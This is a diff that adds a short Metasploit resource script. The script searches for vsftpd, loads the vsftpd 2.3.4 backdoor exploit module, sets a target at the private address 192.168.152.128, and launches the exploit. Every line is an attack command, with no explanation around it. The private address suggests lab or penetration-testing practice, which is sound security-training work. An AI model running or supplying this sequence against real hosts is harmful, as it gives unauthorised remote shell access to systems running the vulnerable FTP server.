@@ -1,0 +1,7 @@
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+options
+set RHOST 192.168.152.128
+options
+exploit
+back
